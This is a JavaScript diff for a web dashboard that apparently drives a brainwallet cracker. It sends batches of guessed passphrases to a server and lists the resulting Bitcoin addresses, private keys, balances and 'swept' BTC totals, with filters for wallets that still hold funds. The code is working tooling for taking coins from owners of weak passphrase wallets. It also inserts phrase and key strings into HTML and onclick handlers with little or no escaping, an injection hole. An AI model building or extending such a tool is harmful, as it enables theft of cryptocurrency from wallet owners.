+    const lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l.length > 1 && l.length < 200);
+    const total = lines.length;
+    infoSpan.textContent = `${file.name}: ${total.toLocaleString()} phrases — sending...`;
+
+    const BATCH = 200;
+    let sent = 0;
+    let errors = 0;
+    for (let i = 0; i < lines.length; i += BATCH) {
+      const batch = lines.slice(i, i + BATCH);
+      try {
+        const r = await fetch(bwApiUrl + '/phrases', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Bypass-Tunnel-Reminder': 'true' },
+          body: JSON.stringify({ phrases: batch }),
+          signal: AbortSignal.timeout(30000)
+        });
+        if (!r.ok) errors++;
+      } catch { errors++; }
+      sent += batch.length;
+      const pct = Math.round(sent / total * 100);
+      bar.style.width = pct + '%';
+      infoSpan.textContent = `${file.name}: ${sent.toLocaleString()}/${total.toLocaleString()} (${pct}%)${errors ? ' — ' + errors + ' errors' : ''}`;
+    }
+    infoSpan.textContent = `${file.name}: Done! ${sent.toLocaleString()} phrases sent${errors ? ', ' + errors + ' batch errors' : ''}`;
+    bar.style.width = '100%';
+  }
+  event.target.value = '';
+  bwFetchStats();
+}
+
+async function bwSendToServer() {
+  const input = document.getElementById('bwPhraseInput').value.trim();
+  if (!input) return alert('Enter phrases first');
+  try {
+    const r = await fetch(bwApiUrl + '/phrases', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Bypass-Tunnel-Reminder': 'true' },
+      body: JSON.stringify({ phrases: input.split('\n').filter(l => l.trim()) }),
+      signal: AbortSignal.timeout(10000)
+    });
+    if (r.ok) document.getElementById('bwStatus').textContent = 'Phrases sent to server!';
+    else document.getElementById('bwStatus').textContent = 'Server error: ' + r.status;
+  } catch (e) { document.getElementById('bwStatus').textContent = 'Cannot reach server'; }
+}
+
+function bwUpdateUI() {
+  document.getElementById('bwTested').textContent = bwLocalStats.tested.toLocaleString();
+  document.getElementById('bwHits').textContent = bwLocalStats.hits.toLocaleString();
+  document.getElementById('bwWithBal').textContent = bwLocalStats.withBal.toLocaleString();
+  const elapsed = (Date.now() - bwLocalStats.startTime) / 1000;
+  document.getElementById('bwSpeed').textContent = elapsed > 0 ? (bwLocalStats.tested / elapsed).toFixed(1) + '/s' : '—';
+  document.getElementById('bwSwept').textContent = bwLocalStats.swept > 0 ? (bwLocalStats.swept / 1e8).toFixed(4) + ' BTC' : '—';
+}
+
+let bwAllResults = [];
+let bwCurrentFilter = 'all';
+let bwPage = 1;
+const BW_PER_PAGE = 20;
+
+function bwRenderResults(results) {
+  bwAllResults = results;
+  const filtered = bwFilterData(results, bwCurrentFilter);
+  const totalPages = Math.max(1, Math.ceil(filtered.length / BW_PER_PAGE));
+  if (bwPage > totalPages) bwPage = totalPages;
+  const start = (bwPage - 1) * BW_PER_PAGE;
+  const pageData = filtered.slice(start, start + BW_PER_PAGE);
+
+  const tbody = document.getElementById('bwResultsBody');
+  const tfoot = document.getElementById('bwResultsFoot');
+  const wrap = document.getElementById('bwResultsWrap');
+  const filters = document.getElementById('bwFilters');
+  const pagination = document.getElementById('bwPagination');
+
+  if (results.length === 0) { wrap.style.display = 'none'; filters.style.display = 'none'; return; }
+  wrap.style.display = ''; filters.style.display = '';
+
+  const countEl = document.getElementById('bwFilterCount');
+  if (countEl) countEl.textContent = `${filtered.length} of ${results.length}`;
+
+  tbody.innerHTML = pageData.map(r => {
+    const bal = r.balance || 0;
+    const funded = r.funded || 0;
+    const balBtc = (bal / 1e8).toFixed(8);
+    const fundedBtc = (funded / 1e8).toFixed(4);
+    const balCls = bal > 0 ? 'bal-live' : 'bal-swept';
+    const privShort = r.privKey ? r.privKey.substring(0, 12) + '...' : '?';
+    const addr = r.addrComp || r.addressCompressed || '';
+    const addrShort = addr ? addr.substring(0, 12) + '...' : '';
+    return `<tr>
+      <td title="${(r.phrase || '').replace(/"/g,'&quot;')}">"${(r.phrase || '').substring(0, 20)}"</td>
+      <td title="${addr}"><span class="bw-copy-btn" onclick="bwCopy('${addr}')">${addrShort}</span></td>
+      <td title="${r.privKey || ''}"><span class="bw-copy-btn" onclick="bwCopy('${r.privKey || ''}')">${privShort}</span></td>
+      <td class="${balCls}">${bal > 0 ? balBtc + ' BTC' : '0'}</td>
+      <td>${fundedBtc} BTC</td>
+      <td>${r.txCount || 0}</td>
+    </tr>`;
+  }).join('');
+
+  const pageBal = pageData.reduce((s, r) => s + (r.balance || 0), 0);
+  const pageFunded = pageData.reduce((s, r) => s + (r.funded || 0), 0);
+  const pageTxs = pageData.reduce((s, r) => s + (r.txCount || 0), 0);
+  const totalBal = filtered.reduce((s, r) => s + (r.balance || 0), 0);
+  const totalFunded = filtered.reduce((s, r) => s + (r.funded || 0), 0);
+  const totalTxs = filtered.reduce((s, r) => s + (r.txCount || 0), 0);
+  tfoot.innerHTML = `<tr style="font-weight:600;border-top:2px solid var(--border);font-size:0.6rem;">
+    <td colspan="3" style="padding:0.375rem 0.5rem;">Page ${bwPage} totals (${pageData.length} rows)</td>
+    <td class="${pageBal > 0 ? 'bal-live' : 'bal-swept'}">${(pageBal / 1e8).toFixed(8)}</td>
+    <td>${(pageFunded / 1e8).toFixed(4)} BTC</td>
+    <td>${pageTxs.toLocaleString()}</td>
+  </tr><tr style="font-size:0.6rem;color:var(--fg-dim);">
+    <td colspan="3" style="padding:0.25rem 0.5rem;">All ${filtered.length} totals</td>
+    <td class="${totalBal > 0 ? 'bal-live' : 'bal-swept'}">${(totalBal / 1e8).toFixed(8)}</td>
+    <td>${(totalFunded / 1e8).toFixed(4)} BTC</td>
+    <td>${totalTxs.toLocaleString()}</td>
+  </tr>`;
+
+  let pagBtns = `<button ${bwPage <= 1 ? 'disabled' : ''} onclick="bwGoPage(1)">&laquo;</button>`;
+  pagBtns += `<button ${bwPage <= 1 ? 'disabled' : ''} onclick="bwGoPage(${bwPage - 1})">&lsaquo;</button>`;
+  const maxBtns = 5;
+  let pStart = Math.max(1, bwPage - Math.floor(maxBtns / 2));
+  let pEnd = Math.min(totalPages, pStart + maxBtns - 1);
+  if (pEnd - pStart < maxBtns - 1) pStart = Math.max(1, pEnd - maxBtns + 1);
+  for (let i = pStart; i <= pEnd; i++) {
+    pagBtns += `<button class="${i === bwPage ? 'active' : ''}" onclick="bwGoPage(${i})">${i}</button>`;
+  }
+  pagBtns += `<button ${bwPage >= totalPages ? 'disabled' : ''} onclick="bwGoPage(${bwPage + 1})">&rsaquo;</button>`;
+  pagBtns += `<button ${bwPage >= totalPages ? 'disabled' : ''} onclick="bwGoPage(${totalPages})">&raquo;</button>`;
+  pagBtns += `<span class="bw-page-info">${start + 1}-${Math.min(start + BW_PER_PAGE, filtered.length)} of ${filtered.length}</span>`;
+  pagination.innerHTML = pagBtns;
+}
+
+function bwGoPage(p) {
+  bwPage = p;
+  bwRenderResults(bwAllResults);
+}
+
+function bwFilterData(data, filter) {
+  if (filter === 'balance') return data.filter(r => (r.balance || 0) > 0);
+  if (filter === 'swept') return data.filter(r => (r.balance || 0) === 0 && (r.funded || 0) > 0);
+  if (filter === 'high') return data.filter(r => (r.funded || 0) >= 1000000);
+  return data;
+}
+
+function bwFilter(f) {
+  bwCurrentFilter = f;
+  bwPage = 1;
+  document.querySelectorAll('.bw-filters button').forEach(b => b.classList.remove('active'));
+  event.target.classList.add('active');
+  bwRenderResults(bwAllResults);
+}
+
+function bwCopy(text) {
+  navigator.clipboard.writeText(text).then(() => {
+    const s = document.getElementById('bwStatus');
+    s.textContent = 'Copied!';
+    setTimeout(() => { s.textContent = ''; }, 1500);
+  });
+}
+
+let bwLastResultCount = 0;
+
+async function fetchBwServerStats() {
+  try {
+    const [statsRes, resultsRes] = await Promise.all([
+      fetch(bwApiUrl + '/stats', { signal: AbortSignal.timeout(10000), headers: { 'Bypass-Tunnel-Reminder': 'true' } }),
+      fetch(bwApiUrl + '/results', { signal: AbortSignal.timeout(10000), headers: { 'Bypass-Tunnel-Reminder': 'true' } })
+    ]);
+    if (statsRes.ok) {
+      const s = await statsRes.json();
+      document.getElementById('bwTested').textContent = (s.totalTested || s.tested || 0).toLocaleString();
+      document.getElementById('bwHits').textContent = (s.hits || 0).toLocaleString();
+      document.getElementById('bwWithBal').textContent = (s.withBalance || 0).toLocaleString();
+      if (s.totalFunded) document.getElementById('bwSwept').textContent = (s.totalFunded / 1e8).toFixed(4) + ' BTC';
+      const badge = document.getElementById('bwBadge');
+      if (s.running) {
+        badge.innerHTML = '<span class="bw-live-dot"></span>scanning';
+        badge.className = 'p71-badge online';
+      } else if (bwRunning) {
+        badge.innerHTML = '<span class="bw-live-dot"></span>local';
+        badge.className = 'p71-badge online';
+      } else {
+        badge.textContent = s.hits > 0 ? s.hits + ' hits' : 'idle';
+        badge.className = 'p71-badge ' + (s.hits > 0 ? 'online' : 'offline');
+      }
+    }
+    if (resultsRes.ok) {
+      const allResults = await resultsRes.json();
+      if (allResults.length > 0 && allResults.length !== bwLastResultCount) {
+        bwLastResultCount = allResults.length;
+        allResults.sort((a, b) => (b.funded || 0) - (a.funded || 0));
+        bwRenderResults(allResults);
+      }
+    }
+  } catch {}
+}
+fetchBwServerStats();
+setInterval(fetchBwServerStats, 10000);
 
 connectSSE();
 </script>
